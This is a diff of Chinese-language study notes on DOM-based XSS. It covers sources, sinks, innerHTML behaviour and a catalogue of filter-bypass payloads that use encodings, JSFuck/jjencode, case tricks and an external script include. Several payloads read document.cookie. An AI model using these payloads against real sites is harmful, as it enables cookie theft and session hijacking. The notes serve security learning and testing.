@@ -99,6 +99,13 @@ Sources -->  ...  --> Sinks
 
 数据源(Sources): 即以下参数来自"用户输入". 用户可控. (如果处理不当可能会有"DOM型XSS")
 
+* 数据源(Sources)包括: URL 通讯 存储 Navigation
+  * Sources 1: URL-based DOM Property Sources   
+  * Sources 2: Communication based Sources      
+  * Sources 3: Storage-based Sources
+  * Sources 4: Navigation-based DOM Property Sources
+  * other
+
 ```javascript
 // Sources 1: URL-based DOM Property Sources
 
@@ -170,14 +177,20 @@ location.search
 
 #### 阶段2.处理数据
 
-web应用处理用户输入数据. 如果没处理(或没正确地处理) "用户输入的数据", 则可能被攻击者构造出payload,实现XSS.
+web应用处理用户输入数据. 如果没处理(或没正确地处理) "用户输入的数据", 则可能被攻击者构造出payload, 实现XSS.
 
 #### 阶段3.数据输出点(Sinks)
 
-数据输出点(Sinks) 触发XSS.
+数据输出点(Sinks) 触发XSS. (阶段3 具体能否成功 取决于 阶段1 阶段2)
 
-可能导致DOM based XSS漏洞的函数: (具体能否成功 取决于 阶段1 阶段2)
+* 数据输出点(Sinks): JavaScript  HTML  URIs
+  * Sinks 1: Sinks that execute payload as JavaScript
+  * Sinks 2: Sinks that execute payload as HTML
+  * Sinks 3: Sinks that evaluate JavaScript URIs
+  * other
 
+
+可能导致DOM based XSS漏洞的函数:
 ```javascript
 // Sinks 1: Sinks that execute payload as JavaScript
 
@@ -249,6 +262,7 @@ test.innerText
 // 输出
 test1 test2
 
+// ----
 
 // 执行
 test.outerHTML
@@ -297,7 +311,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 </html>
 ```
 
-发现 弹出`alert(3)` `alert(1)`(无顺序) 而没有`alert(2)` 原因如下:
+发现 弹出`alert(3)` `alert(1)`(无顺序), 而没有`alert(2)` 原因如下:
 
 **以下这些HTML标签** 比较特殊, 浏览器会把这些标签中的内容作为 **文本** 解析(而不会当作html代码进行解析).
 
@@ -328,7 +342,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
   * 以下这些Payload 都没有用到single quotes(') 或 double quotes (")
 
 - Without event handlers - 不用"事件处理属性"(event handler attribute)
-```
+```html
 # 用object标签的data属性 属性值为javascript:
 # 这个payload在Chrome 76.0.3809.132下无法执行
 <object data=javascript:confirm()>
@@ -344,14 +358,14 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ```
 
 - 不使用空格
-```
+```html
 # 用正斜线 / 代替空格
 <svg/onload=confirm()>
 <iframe/src=javascript:alert(1)>
 ```
 
 - 不使用正斜线`/`(slash)
-```
+```html
 # svg标签的"事件处理属性"
 <svg onload=confirm()>
 # img标签的"事件处理属性"
@@ -361,7 +375,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 - 不使用等号`=`(equal sign)
 
 >[JSFuck](http://www.jsfuck.com/) 优点是只使用6个字符`()[]!+` 即可执行任意JavaScript代码. 缺点是太长了.
-```
+```html
 # 执行JavaScript语句 console.log(666)
 
 # 方法1: eval函数
@@ -386,7 +400,7 @@ onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Obje
 ```
 
 - 不使用尖括号`>`(angular bracket)来结束标签
-```
+```html
 # 使用//可以结束svg标签 需//之后有任意标签<x> 则svg标签中的JavaScript就能成功执行
 <svg onload=confirm()//
 ```
@@ -394,13 +408,13 @@ onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Obje
 
 - 不出现字符串 `alert` `confirm` `prompt`
 
-```
+```html
 # 外联js文件
 <script src=//14.rs></script>
 ```
 
 "事件处理属性"可用的编码方式:\u (Hexadecimal)
-```
+```html
 # "事件处理属性"可用的编码方式 \u编码
 <svg onload=co\u006efirm()>
 <svg onload=z=co\u006efir\u006d,z()>
@@ -408,7 +422,7 @@ onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Obje
 ```
 
 "事件处理属性"可用的编码方式:HTML Entity (Hexadecimal)
-```
+```html
 html实体编码 十六进制  ( 如 字符a ->  &#x0061; )
 <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x32;&#x29;>
 
@@ -417,8 +431,8 @@ html实体编码 十六进制 (不带分号 chrome下可行)
 ```
 
 "事件处理属性"可用的编码方式:HTML Entity (Decimal)
-```
-原始payload为 alert(1)  也可以是更长的 javascript:alert(1)
+```html
+"事件处理属性"的值可以是 alert(1) 或 javascript:alert(1)
 
 html实体编码 十进制
 <svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#50;&#41;>
@@ -428,14 +442,14 @@ html实体编码 十进制 (不带分号 chrome下可行)
 ```
 
 - 不使用有效的html标签
-```
+```html
 # 自定义一个名为x的tag
 <x onclick=confirm()>click here
 <x ondrag=confirm()>drag it
 ```
 
 - Bypass tag blacklisting - 绕过HTML标签黑名单
-```
+```html
 # 绕过不严谨的判断 - 大小写
 </ScRipT>
 
@@ -450,7 +464,7 @@ html实体编码 十进制 (不带分号 chrome下可行)
 ```
 
 - 绕过某些黑名单规则 如`alert(`
-```
+```javascript
 (alert)(document.cookie)
 ((alert))((document.cookie))
 ```
@@ -464,7 +478,7 @@ html实体编码 十进制 (不带分号 chrome下可行)
 ```
 
 - 绕过某些黑名单规则 使用[jjencode](http://utf-8.jp/public/jjencode.html) 或 [aaencode](http://utf-8.jp/public/aaencode.html)编码. 注:编码后的内容可放在"事件处理属性"中 如`onerror=`
-```
+```html
 <script>
 // 语句 alert(document.cookie); 的 jjencode 形式:
 $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"."+$.$$__+$._$+$._$+"\\"+$.__$+$.$_$+$._$$+"\\"+$.__$+$.$_$+$.__$+$.$$$_+");"+"\"")())();
@@ -492,7 +506,7 @@ Decoded Payload:
 - 通过"代码重用"(code-reuse) 实现XSS
 
 参考[Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets](https://acmccs.github.io/papers/p1709-lekiesA.pdf)
-```
+```html
 如果目标站点本来就用到了下面这2个JavaScript库
 <script src="https://code.jquery.com/jquery-1.11.3.js"></script>
 <script src="https://code.jquery.com/mobile/1.4.2/jquery.mobile-1.4.2.js"></script>
